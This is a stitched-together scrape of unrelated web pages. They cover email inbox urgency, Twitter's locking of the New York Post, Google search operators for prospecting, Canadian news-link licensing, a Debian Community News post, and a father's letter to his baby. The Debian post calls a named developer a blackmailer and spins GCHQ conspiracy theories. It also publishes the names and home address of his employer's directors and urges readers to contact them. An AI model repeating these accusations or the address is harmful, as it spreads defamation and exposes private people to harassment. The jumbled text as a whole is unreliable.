<p>At the same time, each inbox medium connotes a inherent sense of urgency. <strong>The medium is the madness</strong>, if you will. No matter what the message says or who sends it, there's a differentiated inbox-level "urgency punch" to your lizard brain whenever any single message (spam or not) comes flying in.</p>
<p>Let's be more specific with some typical inboxes in our lives:</p>
<p><span>
      <a href="https://www.charlieharrington.com/static/f85539e1b1b5e52ca78c881a86f47601/f941f/inboxoverlay.png" target="_blank" rel="noopener">

  </a>
    </span></p>
<p>Phone calls are just about as "urgent" as it gets. Prior to iOS 14, phone calls used to interrupt whatever you were doing, taking up your iPhone's entire screen real estate. Doesn't get more urgent-y than that! Luckily, calls are relatively sparse compared to text messages, which you still need to respond to, but you can "put them on ice" for days at a time with a high-degree of cultural acceptance.</p>
<p>Social media messages are legion in terms of volume. And, while they're not especially urgent from an innate message-level perspective, the platforms do their darndest to "notify" you of "engagement opportunities" to keep you locked-in, so these inboxes fall in the semi-urgent category in my book.</p>
<p>Onto RSS -- my beautiful, dark, twisted RSS. There's truly zero urgency here and relatively few messages (writing blog posts is time-consuming!). Moreover, returning to our message evaluation framework, an RSS inbox only contains messages from known senders, since you've explicitly had to add their RSS feeds to your feed-roll. And, since you've likely done that because you expect to value the contents of their messages, you're likely living in the upper left quadrant in RSS-land, enjoying that drizzled honey and those weird-newspaper rolls.</p>
<p>Email is the real challenge-tunity here.</p>
<h3>Stuck in the Middle With You</h3>
<p>Email is caught in the middle of all these features, both message-level and inbox-level. Anyone can email you at any time with any message, so there's a ton of it, and any message may be useful and/or urgent. That's mostly a good thing, and probably our RFC-writing forerunners wanted it that way.</p>
<p>Thus, we check our email, prodigiously, every single day. All day long. While we're pooping, while we're Zooming, while we're doing any old thing.</p>
<p>Perhaps this is a lens on why newsletters are making a comeback. Email readers are a "captive audience," because we cannot avoid triaging our email inboxes. As long as publishers keep their newsletters top-row-level useful, we'll keep Substacking them. Certainly, the chances of me reading an email newsletter are greater than they would be if I had to visit individual blogs. However, I think my ideal for premium content would be paid RSS feeds, rather than email newsletters, because I want to keep my email inbox clean as possible to aid in my triaging. In fact, this is what many podcasts are now doing (since podcasts are just noisy RSS feeds).</p>
<p>OK, enough about content-monetization (have I mentioned I have a free newsletter below?). How can we make our email inbox <em>feel</em> better? Is it possible to make email feel as good as RSS?</p>
<p>First, we should establish principles-slash-goals for each quadrant in our Conjoined Box of …</p></div></div>

<p><strong>Related Article: <a href="https://www.melovedata.com/what-could-the-polls-be-missing-in-this-presidential-election/" target="_blank" rel="noreferrer noopener">What could polls be missing for this election?</a></strong></p>



<p><em>Disclaimer: I’m a registered voter with no party affiliation. I have a personal interest in tracking major news networks such as CNN, Fox News, Breitbart, the New York Times, and other outlets who publish misleading information since 2008. Twitter is a recent example of a large, influential medium that has now subjectively interfered with information flow to the public.</em></p>



<p>It has been over 10 days since the famous <a href="https://nypost.com/2020/10/14/hunter-biden-emails-show-leveraging-connections-with-dad-to-boost-burisma-pay/" target="_blank" rel="noreferrer noopener">New York Post story</a> discussing Hunter Biden’s activities with the Ukranian energy firm Burisma. Twitter reacted by locking the New York Post’s Twitter account from any activity, citing they were trying to prevent the spread of hacked information. Twitter CEO Jack Dorsey admits <a href="https://variety.com/2020/digital/news/twitter-ceo-nypost-block-wrong-hacked-materials-policy-1234807399/" target="_blank" rel="noreferrer noopener">blocking the story was a mistake</a> and ended up reallowing the sharing of the story on Twitter.</p>



<h3>Then one must ask, <em>why is the New York Post’s Twitter account still locked?</em></h3>



<p>If the decision was reversed, why isn’t the New York Post’s account unlocked? Why isn’t the New York Times account locked due to releasing Trump’s tax returns that were clearly stolen or “hacked”? Especially after the New York Times declined to share their evidence? Here’s a quote from the NYT article where they decline to share:</p>



<blockquote><p>“…Alan Garten, a lawyer for the Trump Organization, said that “most, if not all, of the facts appear to be inaccurate” and requested the documents on which they were based. After The Times declined to provide the records, in order to protect its sources…”</p><cite>https://www.nytimes.com/interactive/2020/09/27/us/donald-trump-taxes.html</cite></blockquote>



<p>So no records have been released “in order to protect sources”, which isn’t an explanation as to why the actual documents haven’t been published. You can publish tax returns without exposing your sources (for an example, look at <a href="https://wikileaks.org/" target="_blank" rel="noreferrer noopener">all of the WikiLeaks releases</a> over time). Ironically, by publishing the tax returns, you’ll force the hand of Trump to actually release his returns. Instead, all we have is the NYT claiming to have records that they won’t show and have obtained without permission.<strong> So why is the New York Post account locked and the NYT account not?</strong> </p>



<h3>A speculation</h3>



<p>Maybe the answer lies in Twitter’s rules and policies, which <a href="https://help.twitter.com/en/rules-and-policies/public-interest" target="_blank" rel="noreferrer noopener">give plenty of wiggle room</a> by utilizing “exceptions” that they alone determine is best for the public interest. Apparently unverified and unreleased tax returns are important for the public interest, but direct evidence of high-ranking US politician’s family member <a href="https://twitter.com/TrumpWarRoom/status/1196831901597806599?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1196831901597806599%7Ctwgr%5Eshare_3%2Ccontainerclick_1&amp;ref_url=https%3A%2F%2Fwww.breitbart.com%2Fpolitics%2F2019%2F11%2F19%2Fbackfire-vindman-admits-hunter-biden-seemed-unqualified-for-burisma-role%2F" target="_blank" rel="noreferrer noopener">receiving a highly paid position without prior credentials</a> is not of concern to the American public. </p>



<p>Maybe it turns out that Twitter is in fact biased? Considering it’s difficult, if not impossible for a human being to truly be entirely objective, Twitter’s review units are undoubtedly biased themselves since they’re made up of humans. Should there be insights into who makes up the committees that Twitter uses to review posts and their potential biases? Either way, the main question is; why are they subjectively trying to change the flow of information to the American public?</p>



<p>You’ll have to come to your own conclusion on that. </p>



<h3>To be transparent, this is my opinion.</h3>



<p>Any institution (private or public) with the power to influence outcomes of anything at scale, are incentivized to take a side. Since humans make up these institutions, they are inherently biased, no matter how hard they try to be unbiased. The resulting bias from the institution’s parts eventually come through as the bias of the whole institution. It’s inevitable and unavoidable, and this is what we’re seeing on Twitter’s decision to lock the New York Post’s account but not the New York Times.</p>



<p>The New York Post should be able to post their own articles without limitation unless other media outlets are restricted as well (such as BuzzFeed news). Unless every single news article is researched by a transparent committee with their justification on blocking/allowing it, one side will always benefit. </p>

        <section>
            <p>The ability to do precise Google searches and getting relevant results is a superpower that is easy to acquire  but most people don't have it. </p>

<p>The goal of this post is:</p>

<ul>
<li>to provide simple and tangible examples to help you gain this superpower </li>
<li>to show you how you can leverage Google for prospecting.</li>
</ul>

<h5 id="googlesearchoperators">Google Search Operators</h5>

<p>Google search operators (also known as “advanced operators”) are commands that extend the capabilities of regular text searches.  With Google search operators you can do anything from market analysis, prospecting people on LinkedIn, retrieving fundraising news, finding emails, etc. Understanding the basics of Google search operators will drastically improve the quality of your search results. </p>

<h5 id="howdogooglesearchoperatorswork">How do Google search operators work?</h5>

<p>Even though there are lots of search operators for you to use, they usually follow a similar syntax like this one:</p>

<p><img src="https://i.imgur.com/IuxJhKz.png" alt="<image>"></p>

<p><strong>Some of the most common search operators are:</strong></p>

<ul>
<li><code>site</code>: Limit results to those from a specific website</li>
<li><code>intitle</code>: Web pages with a certain keyword in the title</li>
<li><code>inurl</code>: Web pages with a certain keyword in the URL</li>
<li><code>filetype</code>: web pages with a certain file type, such as pdf or png</li>
<li><code>[number]..[number]</code>: restricts the search to a certain range of numbers</li>
</ul>

<h4 id="examplesforsalesgrowthandmarketingusecases">Examples for sales, growth, and marketing use cases:</h4>

<blockquote>
  <p><strong>Find: Google spreadsheets that include “startups” and “2020” in the title</strong></p>
</blockquote>

<ul>
<li><a href="https://www.google.com/search?q=site:docs.google.com/spreadsheets+intitle:startups+2020&amp;rlz=1CAZAQH_enPT910&amp;oq=site:docs.google.com/spreadsheets+intitle:startups+2020&amp;aqs=chrome.0.69i59j69i58.1251j0j1&amp;sourceid=chrome&amp;ie=UTF-8"><strong><code>site:docs.google.com/spreadsheets intitle:startups 2020</code></strong></a></li>
</ul>

				<p>News Media Canada (NMC), the lobby group representing the major newspaper publishers in Canada, released a <a href="https://nmc-mic.ca/wp-content/uploads/2020/10/Levelling-the-Digital-Playing-Field-2020.10.19-1.pdf">new report</a> yesterday calling for the creation of a government digital media regulatory agency that would have the power to establish mandated payments for linking to news articles, establish what content is prioritized on social media sites, require companies to disclose algorithmic changes, hand over moderation control of content on news stories to the publishers, and potentially issue fines in the hundreds of millions of dollars. Canadian Heritage Minister Steven Guilbeault has made <a href="https://www.michaelgeist.ca/2020/09/get-money-from-web-giants-why-canadian-heritage-minister-steven-guilbeaults-top-legislative-priority-is-risky-business/">“get money from web giants”</a> his top legislative priority and has expressed support for<a href="https://www.michaelgeist.ca/2020/10/the-guilbeault-internet-plan-leave-it-to-the-crtc-and-copyright-board-of-canada-to-get-money-from-web-giants/"> mandated licensing for links</a>.</p>
<p>The report, which inaccurately describes the <a href="https://www.michaelgeist.ca/2020/09/there-are-many-serious-concerns-about-facebook-why-the-australia-news-fight-isnt-one-of-them/">ill-advised Australian approach</a> to licensing links to news articles, is notable for many of the things it does not say. For example, one could easily read the 41 page report and not realize that companies such as Google and Facebook do not publish full versions of news articles without a licence. Indeed, rather than “taking” content, links to news articles are posted by their users, which then send interested readers back to the original source. In fact, the media companies themselves are typically <a href="https://www.michaelgeist.ca/2020/10/a-day-in-the-life-of-the-toronto-star-on-facebook/">responsible for posting their own articles</a> and granting a licence for their use.</p>
<p>Moreover, the report includes excerpts from an opinion that concludes the sector qualifies under the USMCA’s cultural industries exemption. While that has never been in dispute, it neglects to mention that the same agreement would give the U.S. <a href="https://www.michaelgeist.ca/2020/03/the-cusma-culture-poison-pill/">the right to levy tariffs in response</a> to such a system. The NMC concludes that the measures would raise over $600 million annually, but the U.S. would be entitled to levy retaliatory measures of “equivalent commercial effect” in response to Canadian policies that would violate the trade agreement if not for cultural exemption. That cultural poison pill can be levied anywhere, meaning that the U.S. could target the dairy or steel industries, who would ultimately pay the price for the mandated levies.</p>
<p>Yet the most problematic aspects of the report isn’t what it doesn’t say, but what it does. For one thing, it incorrectly characterizes the Australian approach by suggesting that it includes expanded intellectual property rights. The <a href="https://nmc-mic.ca/wp-content/uploads/2020/10/Levelling-the-Digital-Playing-Field-2020.10.19-1.pdf">NMC report states</a>:<br>
<i><br>
</i><i>Our recommendation is to follow the lessons learned and path outlined in Australia to restore competitive balance in market conditions, which includes:</i><i><br>
</i><i><br>
</i><i>Expanding the intellectual property rights publishers have over their content (and user data) and requiring platforms license such content before using it</i></p>
<p>But the Australian approach is <a href="https://ipwars.com/2020/08/24/press-publishers-new-rights-down-under/">not tied to intellectual property rights</a>. Rather, it is grounded in competition law, not intellectual property law. By conflating the Australian and French approaches (France has pursued a press publishers’ right), the NMC does not even appear to fully understand the policies it is recommending.</p>
<p>Moreover, the NMC calls for a massive regulatory system that would hand the government dramatic new powers over the news and digital media sectors in Canada. The principle of firmly rejecting government regulation of the news sector is summarily dismissed for the sake of a payout from companies that already drive considerable traffic to Canadian news organizations. The proposal – which is remarkably <a href="https://cbc.radio-canada.ca/en/media-centre/sustaining-journalism-for-canadians">endorsed by the CBC</a> – includes the following:</p>
<ul>
<li>Establish a new federal government regulatory agency with responsibility for overseeing Internet platforms</li>
<li>Require platforms to pay licensing fees for linking to content. Failure to pay could result in fines of millions of dollars (the NMC points to ten percent of Canadian revenues)</li>
<li>Require platforms to prioritize original news content. In other words, a government agency would dictate which news stories get priority on Internet platforms</li>
<li>Require Internet companies to provide notice for any changes to algorithms affecting publishers</li>
<li>Hand over moderation of user comments to publishers</li>
</ul>
<p>When combined with Guilbeault’s other plans for the Internet, which include granting the CRTC additional powers to regulate Internet streaming services, the vision is to establish a heavily regulated Internet space in order to get money from Internet companies. There is surely a need for regulatory reforms when it comes to the Internet and I wrote recently about <a href="https://www.michaelgeist.ca/2020/10/forget-link-licensing-and-cross-subsidies-when-it-comes-to-tech-canada-should-be-focused-on-competition-law-and-tax-policy/">digital taxation and the effective application of competition laws</a>. But the NMC reforms are not about tax or marketplace fairness. Rather, they are the product of intense domestic lobbying by Canadian sectors long accustomed to regulatory protection. Should the government agree, the outcome is likely to be increased costs for consumers alongside less access to news as social media sites respond by blocking the sharing of news articles, thereby harming both media organizations and the broader public.</p>

  <hr>
  <time>Oct 26, 2020</time>
  <img width="33%" alt="Jonathan Wiltshire, jmw, Debian, GCHQ, DAM, blackmail" src="https://debian.community/assets/jonathan-wiltshire-1.png">
<p>With the Special Boat Service (SBS), cousins of the SAS, <a href="https://www.theguardian.com/uk-news/2020/oct/25/what-do-we-know-about-the-sbs">storming a ship in the English channel</a>, we feel it is a good time to finally have a look at another DAM <a href="https://debian.community/debian-blackmail-thought-reform-quickstart/">blackmailer</a> and Debian's potential connections to GCHQ.</p>

<p>Jonathan Wiltshire (jmw) works for a small IT firm, <a href="https://www.tiger-computing.co.uk/about-us/team/">Tiger Computing</a> in Monmouth, one of those small unremarkable towns in the Welsh countryside that most of us have never heard of.</p>

<p>We can see that abusive messages have been sent to Debian volunteers during UK business hours and Debian is <a href="https://www.tiger-computing.co.uk/about-us/team/">promoted on the Tiger Computing staff profile</a>.  Debian itself is not incorporated.  Therefore, we feel that it is relevant to consider both Wiltshire and his employer.</p>

<p>Britain is known to have a <a href="https://en.wikipedia.org/wiki/English_defamation_law">tough stance on defamation</a> and any volunteer who has been subject to false accusations would have a strong case under UK law against both Wiltshire and Tiger Computing.  Companies House provides <a href="https://find-and-update.company-information.service.gov.uk/company/03389961/officers">full details of the legal address for service</a>.</p>

<p>If Wiltshire and his DAMs intrude upon your family's Christmas, as they did to two volunteers in 2018, you can contact Wiltshire's boss directly.  We obtained the following names and address from the public company records:</p>

<p>Keith Andrew Edmunds and Dr Anna Cecilia Lindberg, Woodlands, Staunton, Coleford, <b>Gloucestershire</b>, GL16 8NU</p>

<p>We don't normally publish addresses in Debian Community News but in this case, there is a significant public interest factor.  Gloucestershire is the home of <a href="https://en.wikipedia.org/wiki/GCHQ">GCHQ</a>.  Various people have <a href="https://duckduckgo.com/?q=gchq+psyops+debian&amp;t=ffab&amp;ia=web">expressed concerns about GCHQ PsyOps in Debian and open source software</a>.  Each time somebody mentions this, they are censored from Planet sites and mailing lists.  Jacob Appelbaum had explicitly warned about GCHQ infiltration on the <a href="https://debian.community/debian-private-leaked/">debian-private (leaked) gossip network</a>.  In a way, Appelbaum was forecasting his own death, or in this case, the character assassination plot spreading <a href="https://duckduckgo.com/?q=debian+falsified+harassment&amp;t=ffab&amp;ia=web">falsified accusations of harassment</a>.</p>

<img src="https://debian.community/assets/appelbaum-predicted-death-debian-private.png">

<p>We've produced a convenient map showing the proximity of Tiger Computing to both Hereford, the SAS headquarters and Cheltenham, the GCHQ headquarters.</p>

<img src="https://debian.community/assets/debian-gchq-tiger-computing-conspiracy-theory.png">

<p>It is worth looking again at the email from Wiltshire's DAM buddy, Enrico Zini, <a href="https://danielpocock.com/debian-falsified-harassment-claims-appelbaum-expulsion/">fiercely decrying any possibility of a GCHQ infiltration</a>.</p>

<blockquote><em>
Subject: On coverage of Abbelbaum being "banned" from Debian<br>
Date: Wed, 22 Jun 2016 09:34:50 +0200<br>
From: Enrico Zini &lt;enrico@enricozini.org&gt;<br>
To: andrew.matler@itwire.com

<p>Dear Editor in Chief of iTWire,</p>

<p>you may want to do something about this article by Sam Varghese on
Debian revoking membership of Jacop Appelbaum:
http://www.itwire.com/business-it-news/open-source/73441-appelbaum-banned-from-debian-events-after-sexual-misconduct-charges.html</p>

<p><b>While the first part is factually correct in its DPL quote</b>, the article
ends with baseless hints of Debian and Tor having fallen victims to
manipulations by GCHQ psyops.</p>

<p>I consider that to be psycological violence[1] against the various well
known people who came out to report abuse, and I wish that news coverage
about this situation could rather contribute to creating a community
that encourages victims of abuse to speak up.</p>

<p>Quoting the DPL again, "In reaching their decision, the Debian Account
Managers took into account the public disclosures from members of the
Tor project and others, and <b>first-hand accounts from members of the
Debian community</b>."</p>

<p><b>We are not talking about vague rumors</b> spread by a couple of
infiltrators, we are talking about <b>first-person accounts</b> provided by
well known and respected members of both communities, with a track
record of contributions of many years.</p>

<p>These people who had the guts to speak up deserve credit and respect,
and the article published on your site gives them none.</p>

<p>[1] https://en.wikipedia.org/wiki/Gaslighting</p>

<p>Regards,</p>

<p>Enrico</p>
</em></blockquote>

<p>The first-hand accounts were nothing but hearsay.  On the other hand, the GCHQ connection is no conspiracy theory: it is matter of fact, if you are running one of the world's most well funded spy outfits and you <em>hadn't</em> infiltrated Debian, you wouldn't be doing your job properly.</p>

<p>British domestic police forces had been caught <a href="https://en.wikipedia.org/wiki/UK_undercover_policing_relationships_scandal">in similar games, infiltrating environment groups and making women pregnant</a>.</p>

<p>The SAS and SBS do some pretty incredible work.  Even the Australian commandos have chosen to use the name SAS because it has such a good reputation.</p>

<p>Nonetheless, like any organization, there are some bad apples.  A recently published book tells the story of former SAS heroes becoming mercenaries and <a href="https://www.dailymail.co.uk/news/article-7954259/New-book-tells-story-elite-band-ex-special-forces-wreaked-havoc-world.html">dropping grenades onto civilians from a helicopter</a>.  It is gruesome stuff.  From the article:</p>

<blockquote><em>Yet the victims were often women, children and the elderly — innocent civilians caught up in a brutal civil war that raged across the Indian Ocean state during the final decades of the 20th century.</em></blockquote>

<p>Now take a moment and compare this to the behaviour of Wiltshire and the Debian Account Managers, creating false accusations about volunteers and circulating them to over a thousand developers on the <a href="https://debian.community/debian-private-leaked/">debian-private (leaked) gossip network</a>.  In one case, Wiltshire, Zini and Jaspert threw one of these grenades at a volunteer and his family on Christmas eve.</p>

<p>It took the SBS less than 10 minutes to seize control of the ship in unpleasant weather on a Sunday afternoon.  Some of them even went back home in time to give their kids a bedtime story.  Would it really be any more difficult than that for GCHQ to infiltrate a free software project?</p>

But for the time being, your world is going to be quite small, and your needs will be pretty simple. Our home will be the only place that matters for the next few months, and as long as you’re eating and sleeping, life will carry on just beautifully.</p><p><a href="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/A03-You-got-this.png"><img loading="lazy" src="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/A03-You-got-this.png" alt="baby drinking from bottle" width="1500" height="1100" srcset="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/A03-You-got-this.png 1500w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/A03-You-got-this-300x220.png 300w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/A03-You-got-this-1024x751.png 1024w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/A03-You-got-this-768x563.png 768w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/A03-You-got-this-610x447.png 610w" sizes="(max-width: 1500px) 100vw, 1500px"></a></p><p>But pretty soon, you’re going to have all kinds of interesting experiences.</p><p>You’re going to see different places, meet new faces, and feel a wide range of emotions. You’ll find out that there’s more to life than just eating and sleeping, and that there’s a lot out there to explore.</p><p>You’ll understand that Mom, Dad, and you are just a tiny, tiny part of a much, much larger and complicated place.</p><p>And it is this big world that I want to tell you a little bit about today.</p><p><a href="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/B01-Looking-out-into-the-world.png"><img loading="lazy" src="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/B01-Looking-out-into-the-world.png" alt="looking out into the world cartoon illustration" width="1500" height="1100" srcset="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/B01-Looking-out-into-the-world.png 1500w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/B01-Looking-out-into-the-world-300x220.png 300w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/B01-Looking-out-into-the-world-1024x751.png 1024w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/B01-Looking-out-into-the-world-768x563.png 768w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/B01-Looking-out-into-the-world-610x447.png 610w" sizes="(max-width: 1500px) 100vw, 1500px"></a></p><p>There are so many people out there that you will someday meet. They don’t know who you are yet, and you don’t know them either, but these people will one day be your friends, your classmates, your romantic interests, your neighbors, your teachers, the list goes on.</p><p><span><strong>One of the first lessons you’ll learn is that we all want certain things, but we can’t have everything we want. And the way you respond to this reality is what builds character.</strong></span></p><p>You’ll experience this relatively soon, but let’s say that you’re playing with a toy that another child next to you wants. When that happens, your first instinct will be to be protective of what you have, and to keep the toy all for yourself. You’ll think that if you give it up, then it’s no longer yours, and that you had to sacrifice something that was so precious to you.</p><p>But in reality, the best thing for you to do here is to <span><strong>be kind</strong></span>. Kindness is the ability to trade personal gain for mutual trust. By being kind and sharing your toy, you are telling the other child, “Hey. I want to play with this toy too, but by sharing it, I want us to both be able to have fun together now, and also sometime in the future.” By being selfless, you are extending an invitation to enjoy the moment together, and are assuring the other person that you can expect a similar experience if your paths happen to cross again.</p><p>Kindness is what builds friendships. It’s what creates long-lasting partnerships. It is the force that develops trust between you and others, and when it comes to relationships, <span><strong>trust is everything</strong></span>.</p><p><a href="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/B02-Sharing-a-toy-together-v3.png"><img loading="lazy" src="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/B02-Sharing-a-toy-together-v3.png" alt="kids sharing a toy together cartoon illustration" width="1500" height="1100" srcset="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/B02-Sharing-a-toy-together-v3.png 1500w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/B02-Sharing-a-toy-together-v3-300x220.png 300w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/B02-Sharing-a-toy-together-v3-1024x751.png 1024w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/B02-Sharing-a-toy-together-v3-768x563.png 768w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/B02-Sharing-a-toy-together-v3-610x447.png 610w" sizes="(max-width: 1500px) 100vw, 1500px"></a></p><p>The best thing about kindness is that there is no limit to how much you can share, and there is no shortage of people that need it. This leads me to another important thing to remember:</p><p><span><strong>Not everyone is as fortunate to have what you have. The fact that you were born into a loving community places you in a position of abundant opportunity that many others don’t have.</strong></span></p><p>Keep this in mind when you encounter people that you believe are undeserving of your kindness or generosity. While it’s tempting to write these people off immediately, remember that their life experiences are completely different from yours. Just because you don’t understand someone’s behavior doesn’t mean that you are right, and they are wrong. They may not have had the same kind of support network you were born into, or their network simply had values that translated into a wildly different worldview.</p><p>Trying to see their side of the story is another form of kindness that has less to do with sharing, and more to do with listening.</p><p><a href="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/B03-Listening-to-a-friend.png"><img loading="lazy" src="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/B03-Listening-to-a-friend.png" alt="listening to each other drawing illustration" width="1500" height="1100" srcset="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/B03-Listening-to-a-friend.png 1500w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/B03-Listening-to-a-friend-300x220.png 300w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/B03-Listening-to-a-friend-1024x751.png 1024w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/B03-Listening-to-a-friend-768x563.png 768w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/B03-Listening-to-a-friend-610x447.png 610w" sizes="(max-width: 1500px) 100vw, 1500px"></a></p><p>At this point, you might be thinking that eating and sleeping sounds like a far easier life, eh?</p><p>I totally get it. It all sounds like a lot to take in, and it may feel like learning more about the world just introduces more issues that you have to sort through. However, this points to another important thing you’ll realize:</p><p><span><strong>What makes life interesting are its challenges, not its comforts. This is one of those funny things that will only make sense once you live through it.</strong></span></p><p>This is why Mom and Dad won’t give you everything you want, even if we’re more than capable of giving it. Life is weird in that you can desire something a lot, but you’ll value it far less if you didn’t have to work for it. The reward is far less important than the lessons you had to learn to get it, and this holds true for almost everything.</p><p>So if you get frustrated that we’re not giving you what you want, it’s not because we want you to suffer. It’s because we’d rather show you a glimpse of what the world is really like, and not hide you from a reality that you will inevitably experience anyway.</p><p>You’ll soon understand the value of challenges (you’re going to learn how to crawl in a few months!), but one important nuance to keep in mind is that <span><strong>not all challenges are created equal</strong></span>.</p><p>Being challenged by an interesting problem is very different from being challenged by an uninteresting one. If you are working through worthwhile problems, you’ll learn the most because your curiosity is shining bright, and this light will give you the resilience required to traverse difficult yet meaningful journeys. But if your challenge is about fighting off boredom while working on something you could care less about, no reward will matter much in the end.</p><p>You’ll one day learn that money is one of these rewards people get for their work. While it’s important to understand that making money requires various tradeoffs of time and energy, just remember this: <span><strong>Making a lot of money doing something you hate will be far less rewarding than making enough money doing something you love.</strong></span></p><p>Freedom is achieved by clearly defining what “enough” means, and by keeping it there even after you’ve reached it. This allows curiosity – and not money – to be the guiding principle behind why you do the things you do.</p><p>Only then can you dive deeply into the challenges that you can’t stop thinking about.</p><p><a href="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C01-Diving-into-worthwhile-challenges.png"><img loading="lazy" src="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C01-Diving-into-worthwhile-challenges.png" alt="diving deep into challenges and problems" width="1500" height="1100" srcset="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C01-Diving-into-worthwhile-challenges.png 1500w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C01-Diving-into-worthwhile-challenges-300x220.png 300w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C01-Diving-into-worthwhile-challenges-1024x751.png 1024w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C01-Diving-into-worthwhile-challenges-768x563.png 768w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C01-Diving-into-worthwhile-challenges-610x447.png 610w" sizes="(max-width: 1500px) 100vw, 1500px"></a></p><p>Speaking of thought, this leads to another important thing I wanted to share with you:</p><p><span><strong>The most valuable resource you have is not money, not your time, but the way you spend your attention. The way you use your mind will color the way you view the world, so be mindful of the information and people you are in regular contact with.</strong></span></p><p>By surrounding yourself with people you love, you build a world where you are loved. By applying yourself to worthwhile challenges, you live a life where everything is meaningful. By choosing to see the good in humanity, you feel empowered to live up to that standard.</p><p>There will be many forces fighting for your attention, and the greatest skill to cultivate is discerning what to allow, and what to disregard. Mom and Dad can help you navigate that in the beginning, but ultimately, this is something you’ll have to figure out for yourself as you grow up and meet more people.</p><p>Your attention is precious, so be wary of those that try to cheapen it or game it for themselves. By protecting your most valuable resource, you respect the power of your thoughts, and are made aware of what those thoughts are capable of accomplishing.</p><p><a href="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C02-The-power-of-the-mind.png"><img loading="lazy" src="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C02-The-power-of-the-mind.png" alt="hugging the mind cartoon illustration" width="1500" height="1100" srcset="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C02-The-power-of-the-mind.png 1500w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C02-The-power-of-the-mind-300x220.png 300w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C02-The-power-of-the-mind-1024x751.png 1024w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C02-The-power-of-the-mind-768x563.png 768w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C02-The-power-of-the-mind-610x447.png 610w" sizes="(max-width: 1500px) 100vw, 1500px"></a></p><p>As your dad, I understand that I’m going to have a lot of your attention in the beginning. My voice will be a loud one, as I’m going help guide you through all kinds of life problems. It’s going to seem like I have all the answers, and that I’ll know all the right things to say at all the right moments.</p><p>But this is short-lived.</p><p>The reality is that Dad is very flawed, and Dad doesn’t know nearly as much as you once thought. You’ll realize this over time, especially as you expand your circle of friends, loved ones, and people that you admire. And as all those voices grow in influence, it’s only inevitable that mine will decrease in volume. What you once took as certainties from me will merely become suggestions, and to be clear, this is perfectly normal. You don’t ever have to feel bad about that, as that’s just what happens as your world grows.</p><p>All I can hope for is that you’ll continue to interpret my voice as a positive one; one that you can always come to when you need a reminder of how much you are loved. Because if there’s one thing you can count on, it’s that. Mom and Dad will be here for you, no matter what.</p><p><a 